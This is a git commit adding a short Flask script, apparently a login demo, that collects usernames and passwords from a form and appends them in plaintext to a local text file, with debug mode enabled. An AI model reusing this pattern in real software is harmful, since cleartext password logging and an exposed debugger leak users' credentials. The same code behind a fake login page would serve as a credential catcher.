baa8a23b5b69aa9753f9a92804c52ce914f7b052
Epik-Whale463 <122500108+Epik-Whale463@users.noreply.github.com>
2023-09-27 06:47:04 +0530

    Add files via upload
    added all files

---
+++ demo.py
@@ -0,0 +1,28 @@
+from flask import Flask, render_template,request
+
+app = Flask(__name__)
+
+# Create an empty list to store the details
+user_details = []
+
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+@app.route('/', methods=['POST'])
+def getvalue():
+    if request.method == 'POST':
+        username = request.form['username']
+        password = request.form['password']
+        
+        # Append the username and password to the list
+        user_details.append(f'Username: {username}, Password: {password}')
+        
+        # Write the details to the text file
+        with open('details.txt', 'a') as file:
+            file.write(f'Username: {username}, Password: {password}\n')
+        
+        return render_template('index.html')
+
+if __name__ == '__main__':
+    app.run(debug=True)
